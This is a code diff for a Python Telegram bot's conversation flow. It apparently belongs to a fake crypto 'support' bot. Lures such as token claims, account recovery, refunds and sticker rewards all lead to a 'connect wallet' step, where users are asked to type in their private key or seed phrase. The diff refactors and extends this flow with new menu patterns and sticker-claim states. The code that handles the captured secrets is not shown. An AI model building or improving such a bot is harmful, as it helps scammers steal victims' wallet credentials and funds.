+                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
+                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
+                CallbackQueryHandler(handle_back, pattern="^back_"),
+            ],
             MAIN_MENU: [
-                CallbackQueryHandler(show_connect_wallet_button, pattern="^(validation|claim_tokens|claim_tickets|recover_account_progress|assets_recovery|general_issues|rectification|withdrawals|login_issues|missing_balance|account_recovery|claim_spin|refund|claim_sticker_reward)$"),
+                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
+                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
+                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                 CallbackQueryHandler(handle_back, pattern="^back_"),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
             ],
             AWAIT_CONNECT_WALLET: [
+                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
+                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
                 CallbackQueryHandler(show_wallet_types, pattern="^connect_wallet$"),
+                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                 CallbackQueryHandler(handle_back, pattern="^back_"),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
             ],
             CHOOSE_WALLET_TYPE: [
+                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
+                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
+                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                 CallbackQueryHandler(show_other_wallets, pattern="^other_wallets$"),
-                CallbackQueryHandler(show_phrase_options, pattern="^wallet_type_"),
                 CallbackQueryHandler(handle_back, pattern="^back_"),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
             ],
             CHOOSE_OTHER_WALLET_TYPE: [
-                CallbackQueryHandler(show_phrase_options, pattern="^wallet_type_"),
+                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
+                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
+                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                 CallbackQueryHandler(handle_back, pattern="^back_"),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
             ],
             PROMPT_FOR_INPUT: [
+                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
+                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
                 CallbackQueryHandler(prompt_for_input, pattern="^(private_key|seed_phrase)$"),
+                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                 CallbackQueryHandler(handle_back, pattern="^back_"),
             ],
             RECEIVE_INPUT: [
+                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
+                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
+                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, handle_final_input),
             ],
             AWAIT_RESTART: [
+                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
+                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
+                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, handle_await_restart),
+            ],
+            CLAIM_STICKER_INPUT: [
+                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
+                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
+                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
+                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_sticker_input),
+                CallbackQueryHandler(handle_back, pattern="^back_"),
+            ],
+            CLAIM_STICKER_CONFIRM: [
+                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
+                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
+                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
+                CallbackQueryHandler(handle_claim_sticker_confirmation, pattern="^claim_sticker_confirm_(yes|no)$"),
+                CallbackQueryHandler(handle_back, pattern="^back_"),
             ],
         },
         fallbacks=[CommandHandler("start", start)],
@@ -1408,4 +1702,3 @@ def main() -> None:
 
 if __name__ == "__main__":
     main()
-
